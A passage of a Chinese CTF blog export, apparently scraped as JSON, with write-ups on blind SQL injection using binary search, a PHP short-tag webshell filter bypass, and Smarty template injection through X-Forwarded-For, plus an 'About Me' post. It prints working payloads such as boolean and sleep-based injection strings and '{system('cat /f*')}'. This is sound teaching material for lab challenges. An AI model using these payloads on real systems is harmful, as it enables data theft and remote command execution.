emmm，盲注的原理是一个字符的ascii码数值与你的数值作比较，需要一个个进行比较输出 比如爆库的一个查询语句是1^(ascii(substr(database(),1,1))=100) 即数据库名称的第一个字符的ascii 与 100 比较，如果是100 即提交0，返回的值是啊哦 而二分法能够缩短这个过程（ 首先，从数组的中间元素开始搜索，如果该元素正好是目标元素，则搜索过程结束，否则执行下一步。 如果目标元素大于/小于中间元素，则在数组大于/小于中间元素的那一半区域查找，然后重复步骤（1）的操作。 如果某一步数组为空，则表示找不到目标元素。 大致意思是取第一个字符的ascii值和ascii（32，128）中间值，也就是80（刚好是常用的字段）作比较，如果ascii值大于中间值，从（80,132）的中间值比较,重复比较 直至ascii值相等。 结束一个判断的依据 根据页面返回的信息不同，在我的情况中，如果返回的是啊哦，说明是1^1型，那么，啊哦就是正确的依据 Python编写 这里给出post / get请求的两种盲注的脚本（ 其实你只要跑一次就知道为什么要-1了 最后一次输出的值是&lt;120，返回为真，但是我们此时的mid是120，真正的值是&lt;120 get传参也是如此 这里给出buuoj.cn FinalSQL的盲注脚本 我们愉快的跑脚本就完事了 NewStarCTF Week 5： Final Round 延时盲注 题面提示：啊呜，好困呜呜（sleep） 进入靶机 其实已经不用测什么方式注入了，sleep嘛，延时注入 测试语句： 114514||if(length(database())=3,sleep(0.2),1) 如果数据库名长度为3，休眠两秒再访问（ 肉眼可见的延迟 编写脚本 同样使用python脚本，同样也是post请求，同样也是二分法 套异或的就行了，只不过判断的方式有些不同 bool/异或 是根据1和0的两种回应来判断的，而time是根据访问的时间来进行访问的 然后就等吧… 啊呜，好困呜呜 睡一觉就把表跑完了，放心吧 记得renew 靶机 睡了一觉，终于跑完了（我忘记开最后那个倒序重整了，所以flag是倒着的） flag{Ju2t_let_me_sleep_f0r_a_while} 结束辣，好题，但是结束了才会做呜呜呜 看我摆烂的结果如何？ 题目来自：buuoj.cn //NewStarsCTF 图片来自：截图 侵删qwq"},{"title":"About Me","date":"2022-11-07T14:27:49.000Z","url":"/posts/61421.html","tags":[["Introduce_Myself","/tags/Introduce-Myself/"]],"categories":[["Intro","/categories/Intro/"]],"content":"Err0r233的自我介绍qwq 一个普通的摆烂哥，普通到不能再普通 qwq，梦想是做到一份非常简单的高考数学卷 不开玩笑了，真正的梦想是变得有钱qwq 练习时长两分钟的个人练习生，甚至不能说是练过ctf的呜呜 啥也不会，留着摆烂 哈？没有摆烂的人生哪能叫做好人生啊 博客的内容 偶尔写写题解qwq(x) 摆烂的时候写写东西用的 Thai神的任务罢了 以上三点都是错的 所以我要到什么时候才能有钱啊啊啊啊啊啊啊 Friends 提供一下链接和头像就好了（雾） 图片来自：网络/鹰角网络叙拉古人cg 侵删qwq"},{"title":"Buuoj题目(4)","date":"2022-02-01T03:28:18.000Z","url":"/posts/34405.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF Web WriteUp","/categories/CTF-Web-WriteUp/"]],"content":"做做buuoj上的web题，本萌新纯采集，轻喷（（（ [WUSTCTF2020]颜值成绩查询 熟悉的查询框，输入数字查询成绩 尝试输入1’，显示学生不存在 所以普通的注入失败 尝试使用1^1，发现不存在 1^0发现是admin 所以使用布尔盲注即可 [红明谷CTF 2021]write shell 源码如下： 那这里就很简单了，将我们的shell写进$dir内即可 那要怎么写呢？这里过滤了空格、单引号、下划线、php、分号、波浪号、大括号、eval、+、^ PHP短标签 在之前的webshell里讲过，&lt;?=``?&gt; 相当于命令执行 其中的&lt;?= 相当于echo 所以可以直接这样写： 或者是 然后按命令执行做就可以了，空格用%09替换，单引号用双引号替换，然后访问沙箱路径即可获得回显 [CISCN2019 华东南赛区]Web11 Very水的一个题，感觉不如攻防世界的smarty… 页面显示的是IP Address API 并且写道Build with Smarty 可以推测应该是smarty的xff注入，直接打开burp抓包，修改xff测试： Request包： Respond包： 可以发现执行了加法运算 将xff修改：X-Forwarded-For: {system(‘ls /’)} Request包： Response包： 可以看到成功了，直接读flag即可 X-Forwarded-For: {system(‘cat /f*’)} "}]